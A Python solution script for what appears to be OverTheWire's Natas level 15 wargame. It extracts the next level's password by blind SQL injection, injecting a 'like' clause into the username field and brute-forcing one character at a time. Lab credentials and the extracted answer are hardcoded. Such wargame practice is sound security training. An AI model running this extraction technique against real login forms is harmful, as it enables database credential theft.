import requests 
import string
import sys

username='natas15'
password='AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url ="http://{}.natas.labs.overthewire.org/".format(username)

chars = string.ascii_letters+string.digits
passwd = list()
msg = "This user exists."

print(f"Extracting {username} Password From database: ")
pas = ""
#wAIhEacj63wNnIbrOhEQi3p9t0m5nHMh
for i in range(32):
	for c in chars:

		data = {
			'username': 'natas16" and binary password like "{}%'.format(pas+c)
		}

		r = requests.post(url,data=data,auth=(username,password))
		if msg in r.text:
			passwd.append(c)
			pas = "".join(passwd)
			sys.stdout.write("\rExtracting: {}".format( pas+ c))
			sys.stdout.flush()
			break
		sys.stdout.write("\rExtracting: {}".format(pas+c))
		sys.stdout.flush()

print ("\nnatas16 : {}".format(pas))

